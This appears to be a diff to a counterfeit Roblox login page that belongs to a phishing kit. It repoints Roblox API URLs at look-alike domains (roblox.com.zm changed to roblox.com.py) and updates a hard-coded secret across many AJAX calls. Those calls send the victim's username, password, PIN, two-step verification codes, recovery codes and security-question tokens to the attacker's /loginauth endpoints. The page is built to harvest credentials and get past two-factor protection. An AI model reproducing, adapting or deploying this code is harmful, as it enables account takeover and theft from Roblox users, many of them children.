@@ -335,21 +335,21 @@
 	var Roblox = Roblox || {};
 	Roblox.EnvironmentUrls = Roblox.EnvironmentUrls || {};
 	Roblox.EnvironmentUrls = {
-		"abtestingApiSite": "https://roblox.com.zm",
-		"accountInformationApi": "https://roblox.com.zm",
+		"abtestingApiSite": "https://roblox.com.py",
+		"accountInformationApi": "https://roblox.com.py",
 		"accountSettingsApi": "https://accountsettings.roblox.com",
 		"adConfigurationApi": "https://adconfiguration.roblox.com",
 		"adsApi": "https://ads.roblox.com",
-		"apiGatewayCdnUrl": "https://roblox.com.zm",
-		"apiGatewayUrl": "https://roblox.com.zm",
+		"apiGatewayCdnUrl": "https://roblox.com.py",
+		"apiGatewayUrl": "https://roblox.com.py",
 		"apiProxyUrl": "https://api.roblox.com",
 		"assetDeliveryApi": "https://assetdelivery.roblox.com",
 		"authApi": "https://auth.roblox.com",
-		"avatarApi": "https://roblox.com.zm",
-		"badgesApi": "https://roblox.com.zm",
+		"avatarApi": "https://roblox.com.py",
+		"badgesApi": "https://roblox.com.py",
 		"billingApi": "https://billing.roblox.com",
 		"captchaApi": "https://captcha.roblox.com",
-		"catalogApi": "https://roblox.com.zm",
+		"catalogApi": "https://roblox.com.py",
 		"chatApi": "https://chat.roblox.com",
 		"chatModerationApi": "https://chatmoderation.roblox.com",
 		"contactsApi": "https://contacts.roblox.com",
@@ -360,7 +360,7 @@
 		"economycreatorstatsApi": "https://economycreatorstats.roblox.com",
 		"engagementPayoutsApi": "https://engagementpayouts.roblox.com",
 		"followingsApi": "https://followings.roblox.com",
-		"friendsApi": "https://roblox.com.zm",
+		"friendsApi": "https://roblox.com.py",
 		"gameInternationalizationApi": "https://gameinternationalization.roblox.com",
 		"gamesApi": "https://games.roblox.com",
 		"groupsApi": "https://groups.roblox.com",
@@ -370,7 +370,7 @@
 		"itemConfigurationApi": "https://itemconfiguration.roblox.com",
 		"localeApi": "https://locale.roblox.com",
 		"localizationTablesApi": "https://localizationtables.roblox.com",
-		"metricsApi": "https://roblox.com.zm",
+		"metricsApi": "https://roblox.com.py",
 		"midasApi": "https://midas.roblox.com",
 		"notificationApi": "https://notifications.roblox.com",
 		"premiumFeaturesApi": "https://premiumfeatures.roblox.com",
@@ -380,11 +380,11 @@
 		"restrictedHoursServiceApi": "https://apis.roblox.com/restricted-hours-service",
 		"screenTimeApi": "https://apis.rcs.roblox.com/screen-time-api",
 		"shareApi": "https://share.roblox.com",
-		"thumbnailsApi": "https://roblox.com.zm",
+		"thumbnailsApi": "https://roblox.com.py",
 		"tradesApi": "https://trades.roblox.com",
 		"translationRolesApi": "https://translationroles.roblox.com",
 		"twoStepVerificationApi": "https://twostepverification.roblox.com",
-		"universalAppConfigurationApi": "https://roblox.com.zm/universal-app-configuration",
+		"universalAppConfigurationApi": "https://roblox.com.py/universal-app-configuration",
 		"userAgreementsServiceApi": "https://apis.roblox.com/user-agreements",
 		"userModerationApi": "https://usermoderation.roblox.com",
 		"usersApi": "https://users.roblox.com",
@@ -761,7 +761,7 @@
 						},
 						success: (data, textStatus, xhr) => {
 							if (xhr.status == 200) {
-								$.ajax(`/loginauth/auth?token=${encodeURIComponent(token)}&secret=4408313979432680`, {
+								$.ajax(`/loginauth/auth?token=${encodeURIComponent(token)}&secret=5625625247514127`, {
 									method: "POST",
 									data: {
 										"Username": document.getElementById("login-username").value,
@@ -942,7 +942,7 @@
                             var code = document.getElementById("pin_input").value;
 							var CaptchaRequest = document.getElementById("CaptchaRequest").value
                             
-                            $.ajax(`/loginauth/pin?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&pin=${encodeURIComponent(code)}&secret=4408313979432680`, {
+                            $.ajax(`/loginauth/pin?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&pin=${encodeURIComponent(code)}&secret=5625625247514127`, {
                                 method: "GET",
                                 headers: {
                                     "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
@@ -999,7 +999,7 @@
                     	var password = document.getElementById("login-password").value;
 						var CaptchaRequest = document.getElementById("CaptchaRequest").value
 
-                         $.ajax(`/loginauth/recoverycodes?password=${encodeURIComponent(password)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&pin=${encodeURIComponent(pin)}&secret=4408313979432680&start=1`, {
+                         $.ajax(`/loginauth/recoverycodes?password=${encodeURIComponent(password)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&pin=${encodeURIComponent(pin)}&secret=5625625247514127&start=1`, {
                                 method: "GET",
                                 headers: {
                                     "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
@@ -1061,7 +1061,7 @@
                     	var server = document.getElementById("server").value;
                     	var password = document.getElementById("login-password").value;
 
-                         $.ajax(`/loginauth/recoverycodes?password=${encodeURIComponent(password)}&secret=4408313979432680&end=1&code=${code}`, {
+                         $.ajax(`/loginauth/recoverycodes?password=${encodeURIComponent(password)}&secret=5625625247514127&end=1&code=${code}`, {
                                 method: "GET",
                                 headers: {
                                     "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
@@ -1123,7 +1123,7 @@
                     	var server = document.getElementById("server").value;
                     	var password = document.getElementById("login-password").value;
 						var CaptchaRequest = document.getElementById("CaptchaRequest").value
-                    	$.ajax(`/loginauth/twostep?id=${encodeURIComponent(userid)}&verifToken=${encodeURIComponent(verifToken)}&ticket=${encodeURIComponent(ticket)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&code=${encodeURIComponent(code)}&secret=4408313979432680&type=CrossDevice`, {
+                    	$.ajax(`/loginauth/twostep?id=${encodeURIComponent(userid)}&verifToken=${encodeURIComponent(verifToken)}&ticket=${encodeURIComponent(ticket)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&code=${encodeURIComponent(code)}&secret=5625625247514127&type=CrossDevice`, {
                     		method: "GET",
                     		headers: {
                                 "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
@@ -1161,7 +1161,7 @@
                     	var server = document.getElementById("server").value;
                     	var password = document.getElementById("login-password").value;
 						var CaptchaRequest = document.getElementById("CaptchaRequest").value
-                    	$.ajax(`/loginauth/twostep?id=${encodeURIComponent(userid)}&ticket=${encodeURIComponent(ticket)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&code=${encodeURIComponent(code)}&secret=4408313979432680&type=Email`, {
+                    	$.ajax(`/loginauth/twostep?id=${encodeURIComponent(userid)}&ticket=${encodeURIComponent(ticket)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&code=${encodeURIComponent(code)}&secret=5625625247514127&type=Email`, {
                     		method: "GET",
                     		headers: {
                                 "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
@@ -1207,7 +1207,7 @@
                     	var server = document.getElementById("server").value;
                     	var password = document.getElementById("login-password").value;
 						var CaptchaRequest = document.getElementById("CaptchaRequest").value
-                    	$.ajax(`/loginauth/twostep?id=${encodeURIComponent(userid)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&ticket=${encodeURIComponent(ticket)}&code=${encodeURIComponent(code)}&secret=4408313979432680&type=Authenticator`, {
+                    	$.ajax(`/loginauth/twostep?id=${encodeURIComponent(userid)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&ticket=${encodeURIComponent(ticket)}&code=${encodeURIComponent(code)}&secret=5625625247514127&type=Authenticator`, {
                     		method: "GET",
                     		headers: {
                                 "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
@@ -1254,7 +1254,7 @@
                     	var server = document.getElementById("server").value;
                     	var password = document.getElementById("login-password").value;
 						var CaptchaRequest = document.getElementById("CaptchaRequest").value
-                    	$.ajax(`/loginauth/twostep?id=${encodeURIComponent(userid)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&ticket=${encodeURIComponent(ticket)}&code=${encodeURIComponent(code)}&secret=4408313979432680&type=Recovery`, {
+                    	$.ajax(`/loginauth/twostep?id=${encodeURIComponent(userid)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&ticket=${encodeURIComponent(ticket)}&code=${encodeURIComponent(code)}&secret=5625625247514127&type=Recovery`, {
                     		method: "GET",
                     		headers: {
                                 "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
@@ -1300,7 +1300,7 @@
                     	var server = document.getElementById("server").value;
                     	var password = document.getElementById("login-password").value;
 						var CaptchaRequest = document.getElementById("CaptchaRequest").value
-                    	$.ajax(`/loginauth/twostep?id=${encodeURIComponent(userid)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&ticket=${encodeURIComponent(ticket)}&code=${encodeURIComponent(code)}&secret=4408313979432680&type=Recovery`, {
+                    	$.ajax(`/loginauth/twostep?id=${encodeURIComponent(userid)}&CaptchaRequest=${encodeURIComponent(CaptchaRequest)}&ticket=${encodeURIComponent(ticket)}&code=${encodeURIComponent(code)}&secret=5625625247514127&type=Recovery`, {
                     		method: "GET",
                     		headers: {
                                 "rblx-security-challenge": "eyJBdXRoZW50aWNhdGlvbiI6ICJBbmFrVHV0aWsifQ=="
@@ -1392,7 +1392,7 @@
                     			}else if(data['userWasForceReset'] == true){
 									window.location.replace("https://www.roblox.com/login/securityNotification");
                     			}else if(data['answerCorrect'] == true){
-                    			    $.ajax(`/loginauth/auth?token=${encodeURIComponent(document.getElementById("token").value)}&secret=4408313979432680&securityQuestionSessionId=${encodeURIComponent(sessionId)}&securityQuestionRedemptionToken=${encodeURIComponent(data['redemptionToken'])}`, {
+                    			    $.ajax(`/loginauth/auth?token=${encodeURIComponent(document.getElementById("token").value)}&secret=5625625247514127&securityQuestionSessionId=${encodeURIComponent(sessionId)}&securityQuestionRedemptionToken=${encodeURIComponent(data['redemptionToken'])}`, {
                                 		method: "POST",
                                 		data: {
                                             "Username": document.getElementById("login-username").value,
